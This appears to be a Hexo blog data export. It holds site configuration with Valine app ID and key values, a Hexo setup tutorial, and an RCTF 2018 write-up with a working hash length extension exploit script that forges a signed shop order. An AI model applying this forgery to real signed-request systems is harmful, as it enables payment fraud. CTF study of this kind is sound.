字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h3 id=\"为什么要搭建博客呢？\"><a href=\"#为什么要搭建博客呢？\" class=\"headerlink\" title=\"为什么要搭建博客呢？\"></a>为什么要搭建博客呢？</h3><p><del>写博客可以增长知识</del><br><del>写博客可以装逼</del><br>","more":"</p>\n<h4 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h4><p>&emsp;&emsp;写博客可以记录学习上遇到的问题，记录自己的学习过程，对于非常白的小白来说<del>绝对不是我</del>，自己扒资料扒博客是比较痛苦的，很多基础知识不会的话很容易出一些很难搜索到的问题，就比较痛苦了，建议可以先学习一些预备知识，下面讲一下整个搭博客的过程</p>\n<h4 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h4><p> &emsp;&emsp;对于用云服务器这一类的建议在本地搭建一个虚拟机进行尝试后再对服务器动刀（大神绕过），因为已经做好了，我就拿本地复现一遍，我的服务器是<code>ubuntu 16</code>，本地也用同样的系统搭建，不同的系统命令也不同。<br>我选用的框架是hexo,这个框架速度快、支持markdown、一键部署、有很多插件<del>（还不是因为不会用其他的）</del>，网上也有很多同样的教程，教程千篇一律，bug各种各样，希望这篇博客对你有所帮助</p>\n<h5 id=\"大概流程就是\"><a href=\"#大概流程就是\" class=\"headerlink\" title=\"大概流程就是\"></a>大概流程就是</h5><p><code>安装nodejs环境--&gt;安装hexo--&gt;下载一款好看的主题（可省）--&gt;发布你的博客</code><br>酱酱酱</p>\n<h4 id=\"一、nodejs安装教程\"><a href=\"#一、nodejs安装教程\" class=\"headerlink\" title=\"一、nodejs安装教程\"></a>一、nodejs安装教程</h4><pre><code class=\"hljs undefined\">sudo apt-<span class=\"hljs-builtin-name\">get</span> install nodejs\nsudo apt-<span class=\"hljs-builtin-name\">get</span> install npm</code></pre>\n<p>两行代码OK啦，不是ubuntu系统的可以点击这里查看其他命令–&gt;<a href=\"http://www.runoob.com/nodejs/nodejs-install-setup.html\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h4 id=\"二、hexo安装\"><a href=\"#二、hexo安装\" class=\"headerlink\" title=\"二、hexo安装\"></a>二、hexo安装</h4><pre><code class=\"hljs undefined\">sudo npm install -g hexo-<span class=\"hljs-keyword\">cli</span></code></pre>\n<h5 id=\"坑一\"><a href=\"#坑一\" class=\"headerlink\" title=\"坑一\"></a>坑一</h5><p>apt-get 安装的nodejs是4.2.6，hexo需要6.9.0，爬了好多博客才找到<br><pre><code class=\"hljs undefined\">sudo npm install -g <span class=\"hljs-built_in\">n</span>\nsudo <span class=\"hljs-built_in\">n</span> <span class=\"hljs-number\">6.9</span>.<span class=\"hljs-number\">0</span>\n或者 sudo <span class=\"hljs-built_in\">n</span> stable</code></pre></p>\n<p>现在执行刚刚的命令就可以安装hexo了，使用<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">hexo -v</span></code></pre></p>\n<p>可以查看是否正确安装，正确安装会有以下输出提示<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">hexo-cli</span>: 1<span class=\"hljs-selector-class\">.1</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">os</span>: <span class=\"hljs-selector-tag\">Linux</span> 4<span class=\"hljs-selector-class\">.10</span><span class=\"hljs-selector-class\">.0-28-generic</span> <span class=\"hljs-selector-tag\">linux</span> <span class=\"hljs-selector-tag\">x64</span>\n<span class=\"hljs-selector-tag\">http_parser</span>: 2<span class=\"hljs-selector-class\">.8</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">node</span>: 10<span class=\"hljs-selector-class\">.0</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">v8</span>: 6<span class=\"hljs-selector-class\">.6</span><span class=\"hljs-selector-class\">.346</span><span class=\"hljs-selector-class\">.24-node</span><span class=\"hljs-selector-class\">.5</span>\n<span class=\"hljs-selector-tag\">uv</span>: 1<span class=\"hljs-selector-class\">.20</span><span class=\"hljs-selector-class\">.2</span>\n<span class=\"hljs-selector-tag\">zlib</span>: 1<span class=\"hljs-selector-class\">.2</span><span class=\"hljs-selector-class\">.11</span>\n<span class=\"hljs-selector-tag\">ares</span>: 1<span class=\"hljs-selector-class\">.14</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">modules</span>: 64\n<span class=\"hljs-selector-tag\">nghttp2</span>: 1<span class=\"hljs-selector-class\">.29</span><span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">napi</span>: 3\n<span class=\"hljs-selector-tag\">openssl</span>: 1<span class=\"hljs-selector-class\">.1</span><span class=\"hljs-selector-class\">.0h</span>\n<span class=\"hljs-selector-tag\">icu</span>: 61<span class=\"hljs-selector-class\">.1</span>\n<span class=\"hljs-selector-tag\">unicode</span>: 10<span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">cldr</span>: 33<span class=\"hljs-selector-class\">.0</span>\n<span class=\"hljs-selector-tag\">tz</span>: 2018<span class=\"hljs-selector-tag\">c</span></code></pre></p>\n<p>选择一个空的文件夹作为你的站点，在当前路径下初始化你的hexo(报错加sudo试试)<br><pre><code class=\"hljs undefined\">hexo init\nnpm <span class=\"hljs-keyword\">install</span></code></pre></p>\n<p>这样子网站就初步建好了，网站的目录结构就是下面这样子的<br><pre><code class=\"hljs undefined\">.\n├── _config.yml\n├── <span class=\"hljs-keyword\">package</span>.json\n├── scaffolds\n├── <span class=\"hljs-keyword\">source</span>\n |   └── _posts\n└── themes</code></pre></p>\n<p>&emsp;&emsp;<code>_config.yml</code> 文件存放着网站的配置信息，可以在这里配置大部分的参数。<br><code>package.json</code> 文件存放着插件信息，从中可以查看那些插件已经安装。<br><code>scaffolds</code> 是模板文件夹，新建文章时，Hexo 会根据 scaffold 来建立文件，不过这个模板和后面的主题里指的模板不一样。<br><code>source</code> 是存放用户资源的地方的文件夹，除 <code>_posts</code> 文件夹之外，开头命名为 _ (下划线) 的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹（别急，等下会生成的），而其他文件会被拷贝过去。<br><code>themes</code> 主题文件夹，Hexo 会根据主题来生成静态页面，我们以后自己安装的主题也都会放在这个文件夹下面，默认的 <code>landscape</code> 主题已经在里面了。<br>现在我们启动我们的博客<br><pre><code class=\"hljs undefined\">hexo<span class=\"hljs-built_in\"> server\n</span>简写 hexo s</code></pre></p>\n<p>提示4000端口被占用的<a href=\"www.baidu.com\">百度</a>下方法</p>\n<h4 id=\"完工\"><a href=\"#完工\" class=\"headerlink\" title=\"完工\"></a>完工</h4><p>不出意外应该都看得到这两条信息<br><pre><code class=\"hljs undefined\">INFO  <span class=\"hljs-keyword\">Start</span> processing\nINFO  Hexo <span class=\"hljs-keyword\">is</span> running <span class=\"hljs-keyword\">at</span> <span class=\"hljs-keyword\">http</span>://localhost:<span class=\"hljs-number\">4000</span>/. Press Ctrl+C <span class=\"hljs-keyword\">to</span> stop.</code></pre></p>\n<p>现在访问我们虚拟机的ip:4000就可以看到我们的博客啦<br><img src=\"/img/2018-05-07/hexo.png\" srcset=\"/img/static/loading.gif\" alt=\"hexo\"><br>再换一个好看点的主题就可以啦<br><pre><code class=\"hljs undefined\">git clone http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/iissnan/hexo-theme-<span class=\"hljs-keyword\">next</span> themes/<span class=\"hljs-keyword\">next</span></code></pre></p>\n<p>要在站点目录下这个很重要！<br>要在站点目录下这个很重要！<br>要在站点目录下这个很重要！<br><del>太笨了当初在这卡了久</del>  重要的事情说三遍<br>再在站点文件夹下的配置文件<code>_config.yml</code>更换主题就OK啦<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">vim</span> _<span class=\"hljs-selector-tag\">config</span><span class=\"hljs-selector-class\">.yml</span></code></pre></p>\n<p>往下滚到这个位置<br><pre><code class=\"hljs undefined\"><span class=\"hljs-symbol\">theme:</span> landscape</code></pre></p>\n<p>把landscape换成next就ok啦，最后重启下博客<br><img src=\"/img/2018-05-07/next.png\" srcset=\"/img/static/loading.gif\" alt=\"next\"></p>\n<h4 id=\"完善\"><a href=\"#完善\" class=\"headerlink\" title=\"完善\"></a>完善</h4><p>&emsp;&emsp;相信很多小伙伴都觉得挺一般的，这个只是雏形，还有更多细节优化美化要去处理，觉得我的博客不错的可以看看这篇博客<br>戳这里–&gt;<a href=\"https://blog.csdn.net/qq_33699981/article/details/72716951\" target=\"_blank\" rel=\"noopener\">here</a></p>"},{"title":"RCTF密码题cpushop解题过程","index_img":"/img/2018-05-22/index.jpg","date":"2018-05-21T10:23:21.000Z","_content":"### 哈希长度拓展攻击学习\n参考资料：[哈希长度扩展攻击的简介以及HashPump安装使用方法](哈希长度扩展攻击的简介以及HashPump安装使用方法)\n<!--more-->\n#### 关于哈希长度拓展\n&emsp;&emsp;一开始我也是没有想法~~甚至打算爆破的~~，后来在师姐的指引下看了谋篇博客（见参考资料），就和师姐一起做出来了，写篇博客记录下。题目文件已上传到百度云,链接: [https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ](https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ) 密码: f1t2\n##### 大概解题思路\n&emsp;&emsp;解释一下题目，linux下`nc cpushop.2018.teamrois.cn 43000`有四个选项，列出菜单，下订单，支付，退出，flag也在菜单里面，然后就是不择手段买到flag\n&emsp;&emsp;但是我们的钱是`money = random.randint(1000, 10000)`这么来的flag价格是99999，也就是说正常方法我们是无论如何也买不到flag的,然而它检查price的方法用了for循环。。。\n```python\n    for k,v in parse_qsl(payment):\n        if k == 'product':\n            product = v\n        elif k == 'price':\n            try:\n                price = int(v)\n            except ValueError:\n                print 'Invalid Order!'\n                return\n```\n简而言之就是它会一直检查订单里的价格，比方说，你的订单是长介样子的`product=xxx&price=99999&price=1`上面代码出来的最终结果是price=1\nsignkey是一个8到32位的str\n```python\nsignkey = ''.join([random.choice(string.letters+string.digits) for _ in xrange(random.randint(8,32))])\n```\norder的格式\n```python\ndef order():\n    n = input_int('Product ID: ')\n    if n < 0 or n >= len(items):\n        print 'Invalid ID!'\n        return\n    payment = 'product=%s&price=%d&timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000)\n    sign = sha256(signkey+payment).hexdigest()\n    payment += '&sign=%s' % sign\n    print 'Your order:\\n%s\\n' % payment\n```\n##### 长度拓展攻击\n假设\n密文A：xxxxx\n明文B：ABCD\n&emsp;&emsp;你知道(`密文A+明文B`)的哈希值和B，因为A我们不知道，爆破会比较困难，通过哈希长度拓展攻击可以修改B的内容\n假设我们的带的订单内容如下\n```\nproduct=Flag&price=99999&timestamp=1526903707553295&sign=9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4\n```\n那么\n明文B：`product=Flag&price=99999&timestamp=1526903707553295`\nsha256(密文A+明文B)：`9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4\n`\n如果我们可以把订单的明文添加一个&price=1进去，那么pay的过程它经过for循环后最终价格会变化才能1，那么我们的目的就达到了\n最终的一键代码如下，需要安装两个库文件\n```\npip install pwntools\npip install hashpumpy\n```\n```python\nfrom pwn import *\nfrom hashpumpy import hashpump\nimport time\nnc = remote(\"cpushop.2018.teamrois.cn\",43000)\ntxt = nc.recvuntil('Command:')\nprint txt\nnc.send('2')\nprint nc.recvuntil('ID:')\nnc.send('9')\ncode = nc.recvuntil('Command:')\nprint code\nflag = code[13:134]\nhexdata = flag[57:]\noriginal = flag[0:51]\nadd = '&price=1'\ndic = []\nprint original\nfor i in range(8,33):\n    a,b = hashpump(hexdata,original,add,i)\n    order = b + '&sign=' + a\n    nc.send('3')\n    print nc.recvuntil('order:')\n    print i\n    print order\n    nc.send(order)\n    print nc.recvuntil('Command:')\nnc.interactive()\n```\ntip:`hexdata`是A+B的哈希，`original`是B，`add`是要加的内容，`i`是A的长度。\n**爆破A很困难，爆破A的长度就很简单了**\n最后构造出来的订单式长这样子\n```\nproduct=Flag&price=99999&timestamp=1526818398651000\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x88&price=1&sign=b842b4baa0d4405697b740a871ae60dd64617cdfa1846132373e1b3a371c0db3\n```\n","source":"_posts/2018-05-21-RCTF-cpushop.md","raw":"---\ntitle: RCTF密码题cpushop解题过程\nindex_img: /img/2018-05-22/index.jpg\ndate: 2018-05-21 18:23:21\ntags: \n- writeup\n- crypto\n- RCTF\n---\n### 哈希长度拓展攻击学习\n参考资料：[哈希长度扩展攻击的简介以及HashPump安装使用方法](哈希长度扩展攻击的简介以及HashPump安装使用方法)\n<!--more-->\n#### 关于哈希长度拓展\n&emsp;&emsp;一开始我也是没有想法~~甚至打算爆破的~~，后来在师姐的指引下看了谋篇博客（见参考资料），就和师姐一起做出来了，写篇博客记录下。题目文件已上传到百度云,链接: [https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ](https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ) 密码: f1t2\n##### 大概解题思路\n&emsp;&emsp;解释一下题目，linux下`nc cpushop.2018.teamrois.cn 43000`有四个选项，列出菜单，下订单，支付，退出，flag也在菜单里面，然后就是不择手段买到flag\n&emsp;&emsp;但是我们的钱是`money = random.randint(1000, 10000)`这么来的flag价格是99999，也就是说正常方法我们是无论如何也买不到flag的,然而它检查price的方法用了for循环。。。\n```python\n    for k,v in parse_qsl(payment):\n        if k == 'product':\n            product = v\n        elif k == 'price':\n            try:\n                price = int(v)\n            except ValueError:\n                print 'Invalid Order!'\n                return\n```\n简而言之就是它会一直检查订单里的价格，比方说，你的订单是长介样子的`product=xxx&price=99999&price=1`上面代码出来的最终结果是price=1\nsignkey是一个8到32位的str\n```python\nsignkey = ''.join([random.choice(string.letters+string.digits) for _ in xrange(random.randint(8,32))])\n```\norder的格式\n```python\ndef order():\n    n = input_int('Product ID: ')\n    if n < 0 or n >= len(items):\n        print 'Invalid ID!'\n        return\n    payment = 'product=%s&price=%d&timestamp=%d' % (items[n][0], items[n][1], time.time()*1000000)\n    sign = sha256(signkey+payment).hexdigest()\n    payment += '&sign=%s' % sign\n    print 'Your order:\\n%s\\n' % payment\n```\n##### 长度拓展攻击\n假设\n密文A：xxxxx\n明文B：ABCD\n&emsp;&emsp;你知道(`密文A+明文B`)的哈希值和B，因为A我们不知道，爆破会比较困难，通过哈希长度拓展攻击可以修改B的内容\n假设我们的带的订单内容如下\n```\nproduct=Flag&price=99999&timestamp=1526903707553295&sign=9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4\n```\n那么\n明文B：`product=Flag&price=99999&timestamp=1526903707553295`\nsha256(密文A+明文B)：`9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4\n`\n如果我们可以把订单的明文添加一个&price=1进去，那么pay的过程它经过for循环后最终价格会变化才能1，那么我们的目的就达到了\n最终的一键代码如下，需要安装两个库文件\n```\npip install pwntools\npip install hashpumpy\n```\n```python\nfrom pwn import *\nfrom hashpumpy import hashpump\nimport time\nnc = remote(\"cpushop.2018.teamrois.cn\",43000)\ntxt = nc.recvuntil('Command:')\nprint txt\nnc.send('2')\nprint nc.recvuntil('ID:')\nnc.send('9')\ncode = nc.recvuntil('Command:')\nprint code\nflag = code[13:134]\nhexdata = flag[57:]\noriginal = flag[0:51]\nadd = '&price=1'\ndic = []\nprint original\nfor i in range(8,33):\n    a,b = hashpump(hexdata,original,add,i)\n    order = b + '&sign=' + a\n    nc.send('3')\n    print nc.recvuntil('order:')\n    print i\n    print order\n    nc.send(order)\n    print nc.recvuntil('Command:')\nnc.interactive()\n```\ntip:`hexdata`是A+B的哈希，`original`是B，`add`是要加的内容，`i`是A的长度。\n**爆破A很困难，爆破A的长度就很简单了**\n最后构造出来的订单式长这样子\n```\nproduct=Flag&price=99999&timestamp=1526818398651000\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x88&price=1&sign=b842b4baa0d4405697b740a871ae60dd64617cdfa1846132373e1b3a371c0db3\n```\n","slug":"RCTF-cpushop","published":1,"mouth":"05","updated":"2020-09-18T03:21:04.289Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoy40013ez8kd073uqkw","content":"<h3 id=\"哈希长度拓展攻击学习\"><a href=\"#哈希长度拓展攻击学习\" class=\"headerlink\" title=\"哈希长度拓展攻击学习\"></a>哈希长度拓展攻击学习</h3><p>参考资料：<a href=\"哈希长度扩展攻击的简介以及HashPump安装使用方法\">哈希长度扩展攻击的简介以及HashPump安装使用方法</a><br><a id=\"more\"></a></p>\n<h4 id=\"关于哈希长度拓展\"><a href=\"#关于哈希长度拓展\" class=\"headerlink\" title=\"关于哈希长度拓展\"></a>关于哈希长度拓展</h4><p>&emsp;&emsp;一开始我也是没有想法<del>甚至打算爆破的</del>，后来在师姐的指引下看了谋篇博客（见参考资料），就和师姐一起做出来了，写篇博客记录下。题目文件已上传到百度云,链接: <a href=\"https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ</a> 密码: f1t2</p>\n<h5 id=\"大概解题思路\"><a href=\"#大概解题思路\" class=\"headerlink\" title=\"大概解题思路\"></a>大概解题思路</h5><p>&emsp;&emsp;解释一下题目，linux下<code>nc cpushop.2018.teamrois.cn 43000</code>有四个选项，列出菜单，下订单，支付，退出，flag也在菜单里面，然后就是不择手段买到flag<br>&emsp;&emsp;但是我们的钱是<code>money = random.randint(1000, 10000)</code>这么来的flag价格是99999，也就是说正常方法我们是无论如何也买不到flag的,然而它检查price的方法用了for循环。。。<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">for</span> k,v <span class=\"hljs-keyword\">in</span> parse_qsl(payment):\n    <span class=\"hljs-keyword\">if</span> k == <span class=\"hljs-string\">'product'</span>:\n        product = v\n    <span class=\"hljs-keyword\">elif</span> k == <span class=\"hljs-string\">'price'</span>:\n        <span class=\"hljs-keyword\">try</span>:\n            price = int(v)\n        <span class=\"hljs-keyword\">except</span> ValueError:\n            <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'Invalid Order!'</span>\n            <span class=\"hljs-keyword\">return</span></code></pre></p>\n<p>简而言之就是它会一直检查订单里的价格，比方说，你的订单是长介样子的<code>product=xxx&amp;price=99999&amp;price=1</code>上面代码出来的最终结果是price=1<br>signkey是一个8到32位的str<br><pre><code class=\"hljs python\">signkey = <span class=\"hljs-string\">''</span>.join([random.choice(string.letters+string.digits) <span class=\"hljs-keyword\">for</span> _ <span class=\"hljs-keyword\">in</span> xrange(random.randint(<span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">32</span>))])</code></pre></p>\n<p>order的格式<br><pre><code class=\"hljs python\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">order</span><span class=\"hljs-params\">()</span>:</span>\n    n = input_int(<span class=\"hljs-string\">'Product ID: '</span>)\n    <span class=\"hljs-keyword\">if</span> n &lt; <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">or</span> n &gt;= len(items):\n        <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'Invalid ID!'</span>\n        <span class=\"hljs-keyword\">return</span>\n    payment = <span class=\"hljs-string\">'product=%s&amp;price=%d&amp;timestamp=%d'</span> % (items[n][<span class=\"hljs-number\">0</span>], items[n][<span class=\"hljs-number\">1</span>], time.time()*<span class=\"hljs-number\">1000000</span>)\n    sign = sha256(signkey+payment).hexdigest()\n    payment += <span class=\"hljs-string\">'&amp;sign=%s'</span> % sign\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'Your order:\\n%s\\n'</span> % payment</code></pre></p>\n<h5 id=\"长度拓展攻击\"><a href=\"#长度拓展攻击\" class=\"headerlink\" title=\"长度拓展攻击\"></a>长度拓展攻击</h5><p>假设<br>密文A：xxxxx<br>明文B：ABCD<br>&emsp;&emsp;你知道(<code>密文A+明文B</code>)的哈希值和B，因为A我们不知道，爆破会比较困难，通过哈希长度拓展攻击可以修改B的内容<br>假设我们的带的订单内容如下<br><pre><code class=\"hljs undefined\">product=Flag<span class=\"hljs-variable\">&amp;price</span>=<span class=\"hljs-number\">99999</span><span class=\"hljs-variable\">&amp;timestamp</span>=<span class=\"hljs-number\">1526903707553295</span><span class=\"hljs-variable\">&amp;sign</span>=<span class=\"hljs-number\">9226</span>bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4</code></pre></p>\n<p>那么<br>明文B：<code>product=Flag&amp;price=99999&amp;timestamp=1526903707553295</code><br>sha256(密文A+明文B)：<code>9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4</code><br>如果我们可以把订单的明文添加一个&amp;price=1进去，那么pay的过程它经过for循环后最终价格会变化才能1，那么我们的目的就达到了<br>最终的一键代码如下，需要安装两个库文件<br><pre><code class=\"hljs undefined\">pip <span class=\"hljs-keyword\">install</span> pwntools\npip <span class=\"hljs-keyword\">install</span> hashpumpy</code></pre></p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">from</span> hashpumpy <span class=\"hljs-keyword\">import</span> hashpump\n<span class=\"hljs-keyword\">import</span> time\nnc = remote(<span class=\"hljs-string\">\"cpushop.2018.teamrois.cn\"</span>,<span class=\"hljs-number\">43000</span>)\ntxt = nc.recvuntil(<span class=\"hljs-string\">'Command:'</span>)\n<span class=\"hljs-keyword\">print</span> txt\nnc.send(<span class=\"hljs-string\">'2'</span>)\n<span class=\"hljs-keyword\">print</span> nc.recvuntil(<span class=\"hljs-string\">'ID:'</span>)\nnc.send(<span class=\"hljs-string\">'9'</span>)\ncode = nc.recvuntil(<span class=\"hljs-string\">'Command:'</span>)\n<span class=\"hljs-keyword\">print</span> code\nflag = code[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">134</span>]\nhexdata = flag[<span class=\"hljs-number\">57</span>:]\noriginal = flag[<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">51</span>]\nadd = <span class=\"hljs-string\">'&amp;price=1'</span>\ndic = []\n<span class=\"hljs-keyword\">print</span> original\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">33</span>):\n    a,b = hashpump(hexdata,original,add,i)\n    order = b + <span class=\"hljs-string\">'&amp;sign='</span> + a\n    nc.send(<span class=\"hljs-string\">'3'</span>)\n    <span class=\"hljs-keyword\">print</span> nc.recvuntil(<span class=\"hljs-string\">'order:'</span>)\n    <span class=\"hljs-keyword\">print</span> i\n    <span class=\"hljs-keyword\">print</span> order\n    nc.send(order)\n    <span class=\"hljs-keyword\">print</span> nc.recvuntil(<span class=\"hljs-string\">'Command:'</span>)\nnc.interactive()</code></pre>\n<p>tip:<code>hexdata</code>是A+B的哈希，<code>original</code>是B，<code>add</code>是要加的内容，<code>i</code>是A的长度。<br><strong>爆破A很困难，爆破A的长度就很简单了</strong><br>最后构造出来的订单式长这样子<br><pre><code class=\"hljs undefined\">product=Flag&amp;price=<span class=\"hljs-number\">99999</span>&amp;timestamp=<span class=\"hljs-number\">1526818398651000</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">80</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span 